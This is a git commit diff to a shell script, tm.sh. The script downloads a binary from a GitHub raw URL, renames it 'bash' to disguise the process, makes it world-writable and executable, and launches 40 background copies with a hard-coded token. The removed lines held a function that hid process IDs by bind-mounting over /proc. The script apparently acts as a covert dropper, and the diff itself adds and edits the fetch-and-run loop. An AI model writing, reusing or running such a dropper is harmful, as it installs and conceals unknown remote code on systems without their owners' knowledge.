6ad3d0a1716d914ebec80ab3a236ff181f27e081
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2025-04-23 20:01:05 +0800

    Update tm.sh

--- tm.sh
+++ tm.sh
@@ -4,24 +4,19 @@ num="40"
 token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
 execUrl="https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
 
-execPath="`mktemp -d`/bash"
+execName="bash"
+execPath="`mktemp -d`/${execName}"
 wget -qO "${execPath}" "${execUrl}"
 chmod 777 "${execPath}"
 
-hPid() {
-  [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
-}
 
 while [ "$num" -gt "0" ]; do
   execDir=`mktemp -d`;
-  execTmp="${execDir}/bash"
-  ln -sf "$execPath" "$execTmp";
-  cd "${execDir}"
-  "${execTmp}" start accept --token "${token}" 2>&1 &
-  hPid "$!"
-  i=$((i-1)); 
+  ln -sf "$execPath" "${execDir}/${execName}";
+  cd "${execDir}";
+  "./${execName}" start accept --token "${token}" 2>&1 &
+  num=$((num-1)); 
 done
 
-hPid "$$"
 [ "$1" == "1" ] && wait
 
